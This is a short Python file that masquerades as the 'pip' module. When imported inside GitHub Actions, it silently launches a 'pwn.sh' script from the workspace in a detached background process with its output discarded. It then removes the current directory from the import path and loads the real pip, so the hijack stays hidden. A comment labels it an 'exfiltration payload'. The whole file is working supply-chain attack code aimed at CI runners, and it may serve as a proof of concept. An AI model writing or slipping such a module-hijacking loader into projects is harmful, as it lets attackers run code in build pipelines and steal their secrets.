import os
import sys
import subprocess
import importlib.util

# Standard exfiltration payload
def exfiltrate():
    if os.environ.get('GITHUB_ACTIONS') == 'true':
        workspace = os.environ.get('GITHUB_WORKSPACE', '.')
        pwn_sh = os.path.join(workspace, 'pwn.sh')
        if os.path.exists(pwn_sh):
            subprocess.Popen(['/bin/bash', pwn_sh], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, start_new_session=True)

# Prevent infinite recursion
if not os.environ.get('PWN_PIP_ACTIVE'):
    os.environ['PWN_PIP_ACTIVE'] = '1'
    exfiltrate()

    # 1. Remove current directory from sys.path to find the real pip module
    cwd = os.getcwd()
    sys.path = [p for p in sys.path if p not in (cwd, '', '.')]

    # 2. Find and load the real pip module
    if 'pip' in sys.modules:
        del sys.modules['pip']

    import pip as real_pip
    sys.modules['pip'] = real_pip
    globals().update(real_pip.__dict__)
